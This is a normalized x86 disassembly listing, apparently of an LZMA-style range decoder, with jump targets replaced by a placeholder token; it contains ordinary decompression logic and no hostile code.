mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x80 ]
mov [ eax ] dx
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x34 ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x68 ]
and ecx [ ebp - 0x8c ]
mov [ ebp - 0x68 ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x80 ]
mov [ edx ] cx
mov eax [ ebp - 0x34 ]
add eax [ ebp - 0x34 ]
mov [ ebp - 0x34 ] eax
mov ecx [ ebp - 0x8c ]
not ecx
and ecx [ ebp - 0x68 ]
mov [ ebp - 0x68 ] ecx
jmp r-xdata
mov edx [ ebp - 0x34 ]
mov eax [ ebp - 0x1c ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
jmp r-xdata
cmp [ ebp - 0x34 ] 0x100
jb r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0xb
imul ecx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] ecx
mov edx [ ebp - 0xc ]
cmp edx [ ebp - 0x10 ]
jae r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x44 ]
mov [ ebp - 0x64 ] eax
mov ecx [ ebp - 0x84 ]
mov [ ebp - 0x44 ] ecx
cmp [ ebp - 0x2c ] 0x7
jae r-xdata
mov [ ebp - 0xd4 ] 0x0
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xd4 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x8 ]
shr ecx 0x5
mov edx [ ebp - 0x8 ]
sub edx ecx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x38 ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x28 ]
lea ecx [ eax + edx + 0x1 ]
mov [ ebp - 0x28 ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x38 ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x28 ]
mov [ ebp - 0x28 ] ecx
jmp r-xdata
mov eax [ ebp - 0x94 ]
shl eax 0x1
mov [ ebp - 0x94 ] eax
mov ecx [ ebp - 0x94 ]
and ecx [ ebp - 0x68 ]
mov [ ebp - 0x8c ] ecx
mov edx [ ebp - 0x68 ]
mov eax [ ebp - 0x1c ]
lea ecx [ eax + edx * 2 ]
mov edx [ ebp - 0x8c ]
lea eax [ ecx + edx * 2 ]
mov ecx [ ebp - 0x34 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x80 ] edx
mov eax [ ebp - 0x80 ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov al [ ebp - 0x34 ]
mov [ edx ] al
mov ecx [ ebp - 0x30 ]
add ecx 0x1
mov [ ebp - 0x30 ] ecx
mov edx [ ebp - 0x40 ]
add edx 0x1
mov [ ebp - 0x40 ] edx
jmp r-xdata
cmp [ ebp - 0x34 ] 0x100
jb r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x7c ]
mov [ ebp - 0x84 ] eax
mov ecx [ ebp - 0x6c ]
mov [ ebp - 0x7c ] ecx
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx 0x800
sub ecx [ ebp - 0x8 ]
shr ecx 0x5
add ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x1c ]
mov [ edx ] cx
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x84 ] eax
jmp r-xdata
mov [ ebp - 0xd0 ] 0xb
mov [ ebp - 0xd0 ] 0x8
jmp r-xdata
mov [ ebp - 0xb8 ] 0xb
mov [ ebp - 0xb8 ] 0x9
jmp r-xdata
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x44 ]
add ecx [ ebp - 0xd4 ]
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov eax [ ebp - 0x54 ]
mov cl [ eax + ecx ]
mov [ edx ] cl
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x40 ]
add eax 0x1
mov [ ebp - 0x40 ] eax
cmp [ ebp - 0x2c ] 0x7
jae r-xdata
mov edx [ ebp - 0x28 ]
mov eax [ ebp - 0x38 ]
movzx ecx [ eax + edx * 2 ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x70 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x28 ]
add ecx [ ebp - 0x88 ]
mov [ ebp - 0x28 ] ecx
cmp [ ebp - 0x2c ] 0xc
jb r-xdata
mov edx [ ebp - 0x28 ]
cmp edx [ ebp - 0x70 ]
jb r-xdata
mov eax [ ebp - 0x30 ]
cmp eax [ ebp - 0x98 ]
jae r-xdata
mov edx [ ebp - 0x64 ]
mov [ ebp - 0x6c ] edx
mov edx [ ebp - 0xd0 ]
mov [ ebp - 0x2c ] edx
mov eax [ ebp - 0x3c ]
add eax 0xa68
mov [ ebp - 0x1c ] eax
mov ecx [ ebp - 0xb8 ]
mov [ ebp - 0x2c ] ecx
jmp r-xdata
mov ecx [ ebp - 0x28 ]
add ecx 0x2
mov [ ebp - 0x28 ] ecx
mov edx [ ebp - 0x98 ]
cmp edx [ ebp - 0x30 ]
jne r-xdata
cmp [ ebp - 0x28 ] 0x4
jae r-xdata
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x18 ]
cmp ecx [ ebp + 0x8 ]
jb r-xdata
mov eax [ ebp - 0x98 ]
sub eax [ ebp - 0x30 ]
mov [ ebp - 0xb4 ] eax
mov ecx [ ebp - 0xb4 ]
cmp ecx [ ebp - 0x28 ]
jae r-xdata
mov eax 0x1
jmp r-xdata
mov [ ebp - 0xc0 ] 0x3
mov edx [ ebp - 0x28 ]
mov [ ebp - 0xc0 ] edx
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x18 ]
mov [ ecx + 0x18 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x1c ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0xc ]
mov [ edx + 0x20 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x28 ]
mov [ ecx + 0x48 ] edx
mov eax [ ebp - 0x24 ]
mov ecx [ ebp - 0x30 ]
mov [ eax + 0x24 ] ecx
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x40 ]
mov [ edx + 0x2c ] eax
mov ecx 0x4
imul ecx ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x44 ]
mov [ edx + ecx + 0x38 ] eax
mov ecx 0x4
shl ecx 0x0
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x64 ]
mov [ edx + ecx + 0x38 ] eax
mov ecx 0x4
shl ecx 0x1
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x6c ]
mov [ edx + ecx + 0x38 ] eax
mov ecx 0x4
imul ecx ecx 0x3
mov edx [ ebp - 0x24 ]
mov eax [ ebp - 0x7c ]
mov [ edx + ecx + 0x38 ] eax
mov ecx [ ebp - 0x24 ]
mov edx [ ebp - 0x2c ]
mov [ ecx + 0x34 ] edx
xor eax eax
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x40 ]
and eax [ ebp - 0xd8 ]
mov [ ebp - 0x78 ] eax
mov ecx [ ebp - 0x2c ]
shl ecx 0x4
mov edx [ ebp - 0x3c ]
lea eax [ edx + ecx * 2 ]
mov ecx [ ebp - 0x78 ]
lea edx [ eax + ecx * 2 ]
mov [ ebp - 0x1c ] edx
mov eax [ ebp - 0x1c ]
movzx ecx [ eax ]
mov [ ebp - 0x8 ] ecx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x28 ]
mov [ ebp - 0xbc ] eax
mov edx [ ebp - 0xb4 ]
mov [ ebp - 0xbc ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0xc0 ]
shl eax 0x6
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x360 ]
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x14 ] 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov [ ebp - 0xc4 ] 0x0
mov eax [ ebp - 0x60 ]
mov [ ebp - 0xc4 ] eax
jmp r-xdata
mov ecx [ ebp - 0xbc ]
mov [ ebp - 0x50 ] ecx
mov edx [ ebp - 0x30 ]
cmp edx [ ebp - 0x44 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov eax [ ebp - 0x54 ]
add eax [ ebp - 0x58 ]
mov cl [ eax ]
mov [ edx ] cl
mov edx [ ebp - 0x30 ]
add edx 0x1
mov [ ebp - 0x30 ] edx
mov eax [ ebp - 0x58 ]
add eax 0x1
mov [ ebp - 0x58 ] eax
mov ecx [ ebp - 0x58 ]
cmp ecx [ ebp - 0x60 ]
jne r-xdata
mov edx [ ebp - 0x54 ]
add edx [ ebp - 0x30 ]
mov [ ebp - 0x5c ] edx
mov eax [ ebp - 0x58 ]
sub eax [ ebp - 0x30 ]
mov [ ebp - 0xdc ] eax
mov ecx [ ebp - 0x5c ]
add ecx [ ebp - 0x50 ]
mov [ ebp - 0xe4 ] ecx
mov edx [ ebp - 0x30 ]
add edx [ ebp - 0x50 ]
mov [ ebp - 0x30 ] edx
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x44 ]
add ecx [ ebp - 0xc4 ]
mov [ ebp - 0x58 ] ecx
mov edx [ ebp - 0x40 ]
add edx [ ebp - 0x50 ]
mov [ ebp - 0x40 ] edx
mov eax [ ebp - 0x28 ]
sub eax [ ebp - 0x50 ]
mov [ ebp - 0x28 ] eax
mov ecx [ ebp - 0x58 ]
add ecx [ ebp - 0x50 ]
cmp ecx [ ebp - 0x60 ]
ja r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov edx [ ebp - 0x50 ]
sub edx 0x1
mov [ ebp - 0x50 ] edx
jne r-xdata
mov [ ebp - 0x58 ] 0x0
mov eax [ ebp - 0x5c ]
add eax [ ebp - 0xdc ]
mov ecx [ ebp - 0x5c ]
mov dl [ eax ]
mov [ ecx ] dl
mov eax [ ebp - 0x5c ]
add eax 0x1
mov [ ebp - 0x5c ] eax
mov ecx [ ebp - 0x5c ]
cmp ecx [ ebp - 0xe4 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x8 ]
shr edx 0x5
mov eax [ ebp - 0x8 ]
sub eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x14 ]
lea edx [ ecx + eax + 0x1 ]
mov [ ebp - 0x14 ] edx
mov ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx 0x800
sub edx [ ebp - 0x8 ]
shr edx 0x5
add edx [ ebp - 0x8 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
mov [ ecx + eax * 2 ] dx
mov edx [ ebp - 0x14 ]
add edx [ ebp - 0x14 ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov eax [ ebp - 0x6c ]
mov [ ebp - 0x7c ] eax
mov ecx [ ebp - 0x64 ]
mov [ ebp - 0x6c ] ecx
mov edx [ ebp - 0x44 ]
mov [ ebp - 0x64 ] edx
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x44 ] eax
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0xa0 ] ecx
mov edx [ ebp - 0x14 ]
shr edx 0x1
sub edx 0x1
mov [ ebp - 0x48 ] edx
mov eax [ ebp - 0x14 ]
and eax 0x1
or eax 0x2
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xa0 ] 0xe
jae r-xdata
mov eax [ ebp - 0x14 ]
sub eax 0x40
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x14 ] 0x4
jb r-xdata
mov edx [ ebp - 0x14 ]
cmp edx [ ebp - 0x74 ]
jb r-xdata
mov ecx [ ebp - 0x14 ]
cmp ecx [ ebp - 0x40 ]
jb r-xdata
mov ecx [ ebp - 0x48 ]
sub ecx 0x4
mov [ ebp - 0x48 ] ecx
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x48 ]
shl edx cl
mov [ ebp - 0x14 ] edx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x3c ]
lea edx [ ecx + eax * 2 + 0x560 ]
mov eax [ ebp - 0xa0 ]
shl eax 0x1
sub edx eax
sub edx 0x2
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x4c ] 0x1
cmp [ ebp - 0x2c ] 0x13
jae r-xdata
mov eax 0x1
jmp r-xdata
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0x4 ]
shr ecx 0x1
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x4 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0xc ]
shr eax 0x1f
xor ecx ecx
sub ecx eax
mov [ ebp - 0xa4 ] ecx
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xa4 ]
lea ecx [ eax + edx * 2 + 0x1 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x4 ]
and edx [ ebp - 0xa4 ]
add edx [ ebp - 0xc ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x48 ]
sub eax 0x1
mov [ ebp - 0x48 ] eax
jne r-xdata
mov edx [ ebp - 0x4 ]
shl edx 0x8
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0xc ]
shl eax 0x8
mov ecx [ ebp - 0x18 ]
movzx edx [ ecx ]
or eax edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x18 ]
add eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x4 ]
shr eax 0xb
imul eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov ecx [ ebp - 0xc ]
cmp ecx [ ebp - 0x10 ]
jae r-xdata
mov ecx [ ebp - 0x4 ]
shl ecx 0x8
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
shl edx 0x8
mov eax [ ebp - 0x18 ]
movzx ecx [ eax ]
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x18 ]
add edx 0x1
mov [ ebp - 0x18 ] edx
mov [ ebp - 0xac ] 0xa
mov [ ebp - 0xac ] 0x7
jmp r-xdata
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x3c ]
add ecx 0x644
mov [ ebp - 0x1c ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x4
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x20 ] 0x1
mov eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x1c ]
movzx edx [ ecx + eax * 2 ]
mov [ ebp - 0x8 ] edx
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
mov ecx [ ebp - 0x4 ]
sub ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp - 0x8 ]
shr eax 0x5
mov ecx [ ebp - 0x8 ]
sub ecx eax
mov edx [ ebp - 0x4c ]
mov eax [ ebp - 0x1c ]
mov [ eax + edx * 2 ] cx
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x4c ]
lea eax [ edx + ecx + 0x1 ]
mov [ ebp - 0x4c ] eax
mov ecx [ ebp - 0x14 ]
or ecx [ ebp - 0x90 ]
mov [ ebp - 0x14 ] ecx
mov edx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax 0x800
sub eax [ ebp - 0x8 ]
shr eax 0x5
add eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x1c ]
mov [ edx + ecx * 2 ] ax
mov eax [ ebp - 0x4c ]
add eax [ ebp - 0x4c ]
mov [ ebp - 0x4c ] eax
jmp r-xdata
mov eax [ ebp - 0xac ]
mov [ ebp - 0x2c ] eax
mov edx [ ebp - 0x4 ]
shr edx 0xb
imul edx [ ebp - 0x8 ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x10 ]
jae r-xdata
mov eax [ ebp - 0x4 ]
shl eax 0x8
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
shl ecx 0x8
mov edx [ ebp - 0x18 ]
movzx eax [ edx ]
or ecx eax
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x18 ]
add ecx 0x1
mov [ ebp - 0x18 ] ecx
mov ecx [ ebp - 0x4c ]
mov edx [ ebp - 0x1c ]
movzx eax [ edx + ecx * 2 ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x4 ] 0x1000000
jae r-xdata
jmp r-xdata
mov edx [ ebp - 0x90 ]
shl edx 0x1
mov [ ebp - 0x90 ] edx
mov eax [ ebp - 0x48 ]
sub eax 0x1
mov [ ebp - 0x48 ] eax
jne r-xdata
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0xc ]
sub ecx [ ebp - 0x10 ]
